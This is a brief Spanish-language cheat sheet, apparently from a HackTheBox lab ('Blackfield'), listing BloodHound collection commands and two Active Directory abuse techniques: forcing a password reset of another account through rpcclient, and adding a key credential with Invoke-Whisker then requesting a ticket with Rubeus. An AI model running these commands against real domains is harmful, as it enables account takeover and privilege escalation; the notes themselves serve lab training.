# BloodHound

### Uso de BloodHound-python
```null
bloodhound-python -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.10.10.192 -c All
```

### Inicialización Neo4j
```null
sudo neo4j console
bloodhound &>/dev/null & disown
```

### SharpHound Inyector
```null
PS C:\Temp> .\SharpHound.exe -c All
```

## Abuso de ForceChangePassword

### Modificación de contraseña por RPC
```null
rpcclient -U blackfield/support 10.10.10.192
rpcclient $> setuserinfo audit2020 23 H@CKTHEB0X#
```

## Abuso AddKeyCredentialLink 

### Uso de Invoke-Whisker (Obtención Hash NT)

```null
PS C:\Temp> Invoke-Whisker -Command "add /target:sflowers"
```

```null
.\Rubeus.exe asktgt /user:sflowers /certificate:<CERTIFICATE>
```

